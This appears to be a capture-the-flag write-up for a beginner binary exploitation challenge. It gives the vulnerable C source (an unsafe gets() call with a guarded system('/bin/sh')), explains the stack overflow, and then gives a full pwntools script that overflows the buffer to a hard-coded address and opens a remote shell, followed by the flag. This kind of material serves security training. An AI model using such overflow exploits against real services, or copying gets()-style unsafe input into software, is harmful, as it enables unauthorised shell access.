# beginner-generic-pwn-number-0

## Challenge

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### Source

```c
int main(void)
{
  srand(time(0));
  long inspirational_message_index = rand() % (sizeof(inspirational_messages) / sizeof(char *));
  char heartfelt_message[32];
  
  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  puts(inspirational_messages[inspirational_message_index]);
  puts("rob inc has had some serious layoffs lately and i have to do all the beginner pwn all my self!");
  puts("can you write me a heartfelt message to cheer me up? :(");

  gets(heartfelt_message);

  if(inspirational_message_index == -1) {
    system("/bin/sh");
  }
}
```

## Solution

Binary contains an unsafe call to `gets`.

Overflow the buffer and overwrite the return address with the call to `system("/bin/sh")`.

Alternatively, overflow the buffer and overwrite the `inspirational_message_index` to have a value of -1.

## Exploit

```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host mc.ax --port 31199 beginner-generic-pwn-number-0
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('beginner-generic-pwn-number-0')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'mc.ax'
port = int(args.PORT or 31199)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

win = 0x004012ac

payload = flat({
    0x30+8: win,
    })

io.sendline(payload)

io.interactive()
```

## Flag

`flag{im-feeling-a-lot-better-but-rob-still-doesnt-pay-me}`

